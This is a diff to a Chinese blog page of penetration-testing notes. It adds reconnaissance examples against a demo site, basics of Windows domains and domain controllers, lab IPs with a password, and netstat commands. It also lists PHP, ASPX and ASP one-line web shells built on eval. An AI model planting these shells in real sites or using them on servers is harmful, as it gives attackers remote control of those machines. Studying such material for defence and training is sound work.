@@ -596,6 +596,19 @@
 <p><strong>5.渗透攻击阶段</strong></p>
 <p><strong>6.后渗透攻击阶段</strong></p>
 <p><strong>7.报告阶段</strong></p>
+<h2 id="二、相关命令"><a href="#二、相关命令" class="headerlink" title="二、相关命令"></a><strong>二、相关命令</strong></h2><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h3><h4 id="whois域名注册信息查询"><a href="#whois域名注册信息查询" class="headerlink" title="whois域名注册信息查询"></a><strong>whois</strong>域名注册信息查询</h4><p>一般域名注册信息包含<strong>域名所有者、服务商、管理员邮件地址、域名注册信息和过期日期</strong>等</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; whois testfire.net</span><br><span class="line">[*] exec: whois testfire.net</span><br><span class="line">   Domain Name: TESTFIRE.NET</span><br><span class="line">   Registry Domain ID: 8363973_DOMAIN_NET-VRSN</span><br><span class="line">   Registrar WHOIS Server: whois.corporatedomains.com</span><br><span class="line">   Registrar URL: http://www.cscglobal.com/global/web/csc/digital-brand-services.html</span><br><span class="line">   Updated Date: 2019-09-08T04:08:07Z</span><br><span class="line">   Creation Date: 1999-07-23T13:52:32Z</span><br><span class="line">   Registry Expiry Date: 2020-07-23T13:52:32Z</span><br><span class="line">   Registrar: CSC Corporate Domains, Inc.</span><br><span class="line">   Registrar IANA ID: 299</span><br><span class="line">   Registrar Abuse Contact Email: domainabuse@cscglobal.com</span><br><span class="line">   Registrar Abuse Contact Phone: 8887802723</span><br></pre></td></tr></table></figure>
+
+<p>注意：查询的时候去掉www、ftp等前缀，<a href="http://www.abc.com" target="_blank" rel="noopener">www.abc.com</a> 是abc.com的一个子域名</p>
+<hr>
+<h4 id="nslookup与dig域名查询"><a href="#nslookup与dig域名查询" class="headerlink" title="nslookup与dig域名查询"></a>nslookup与dig域名查询</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nslookup</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">set</span> <span class="built_in">type</span>=A  <span class="comment">#可以对其ip地址进行解析   set type=MX 可以查找邮件转发服务器</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> testfire.net</span></span><br><span class="line">Server:         114.114.114.114</span><br><span class="line">Address:        114.114.114.114#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:   testfire.net</span><br><span class="line">Address: 65.61.137.117</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; dig @ASIA3.AKAM.NET testfire.net  #使用方法--dig @DNS服务器 待查询的域名</span><br><span class="line">[*] exec: dig @ASIA3.AKAM.NET testfire.net</span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @ASIA3.AKAM.NET testfire.net</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 53989</span><br><span class="line">;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line">;; WARNING: recursion requested but not available</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;testfire.net.                  IN      A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">testfire.net.           86400   IN      A       65.61.137.117</span><br><span class="line"></span><br><span class="line">;; Query time: 300 msec</span><br><span class="line">;; SERVER: 23.211.61.64#53(23.211.61.64)</span><br><span class="line">;; WHEN: 四 4月 23 22:19:09 CST 2020</span><br><span class="line">;; MSG SIZE  rcvd: 57</span><br></pre></td></tr></table></figure>
+
+
+
+
+
 
       
       <!-- reward -->
@@ -668,6 +681,34 @@
       
       <hr>
 <p>光看书不动手是无法更深刻理解的，一开始还是跟着大佬的步骤走，再自己复现一遍，尽可能搞懂每一步！</p>
+<h2 id="1-内网基础知识"><a href="#1-内网基础知识" class="headerlink" title="1.内网基础知识"></a>1.内网基础知识</h2><p><strong>工作组：</strong>在工作组中的网络可以互相访问对方的共享资源，主要按部门或者功能进行分组</p>
+<p><strong>域（Domain）：</strong>是一个有安全边界的计算机集合，可以理解为升级版的工作组，但域的安全管理控制机制更加严格。用户必须以合法的身份登录域，且用户的权限是根据用户在域中的身份决定的。</p>
+<p><strong>域控制器（DC）：</strong>可以理解为一个单位的门禁系统，负责所有连入的计算机和用户的验证工作</p>
+<p>域控制器存在这个域所有账户、密码等信息的数据库</p>
+<p>域中一般有以下几个环境：</p>
+<p><strong>单域：</strong>在一个地理位置固定的小公司，建立一个域就可以了。一般一个域至少两台域服务器，一个作为DC，另一台作为备份DC。</p>
+<p>父域和子域：第一个创建的域为父域，各分部的域称为该域的子域。例如一个大公司的各个分公司位于不同的地点，就需要用到父域和子域。因为在同一个域当中，信息交互是比较多的，而且不能压缩。而不同域信息交互比较少，而且可以压缩。同时也为了安全考虑，每个域都有自己的安全策略，比如财务部希望使用特定的安全策略（包括账号密码策略）</p>
+<p><strong>域树：</strong>是多个域通过建立信任关系组成的集合</p>
+<p>（父）abc.com —-asia.abc.com ——cn.asia.abc.com（子）</p>
+<p>abc.com—–europe.abc.com—–ft.asia.abc.com</p>
+<p>子域只能使用父域的名字作为其域名的后缀</p>
+<p><strong>域森林：</strong>多个域树建立信任关系组成的集合</p>
+<p>比如abc.com要合并abc.net，但无法挂下，所以需要建立信任关系来构成</p>
+<p><strong>域名服务器（Domain Name Server，DNS）：</strong>是指用于实现域名和与之相对应的IP地址转换的服务器</p>
+<p>域树的域名和DNS域名非常相似，实际上，因为域中的计算机是使用DNS来定位域控制器、服务器以及其他计算机、网络服务的，所以域的名字就是DNS域的名字。</p>
+<p><strong>在内网渗透中，大部分是通过寻找DNS服务器来确定域控制器的位置（这两者通常配值在一台机子上）</strong></p>
+<p><strong>活动目录：</strong>是指域环境中提供目录服务的组件</p>
+<p>域服务器和活动目录的区别：</p>
+<p>kail ip:192.168.126.1</p>
+<p>win7 ip:192.168.52.143  /   外网：192.168.126.128</p>
+<p>winK3 ip:192.168.52.141</p>
+<p>win2008: 密码改为hongri@2019  ip:192.168.52.138</p>
+<p>netstat -an 查看被打开的端口列表</p>
+<p>netstat -ano 查看所有占用端口的列表</p>
+<p>netstat -ano | findstr “80” 查看某个具体端口的占用情况</p>
+<p>tasklist | findstr “680”  查看具体哪个应用被占用了</p>
+<p>一句话木马：</p>
+<p>php一句话木马：<br>　　 <?php @eval($_POST[value]);?><br>　　<br>aspx一句话木马：<br>　　&lt;%@ Page Language=“Jscript”%&gt;<br>　　&lt;%eval(Request.Item[“value”])%&gt;<br>　　<br>asp一句话木马：<br>　　 &lt;%execute(request(“v”))%&gt;</p>
 
       
       <!-- reward -->
@@ -1681,6 +1722,9 @@
 <p>5、环境关闭</p>
 <p>docker-compose down</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p root</span><br></pre></td></tr></table></figure>
+
+<p>dpkg -i </p>
+
       
       <!-- reward -->
       
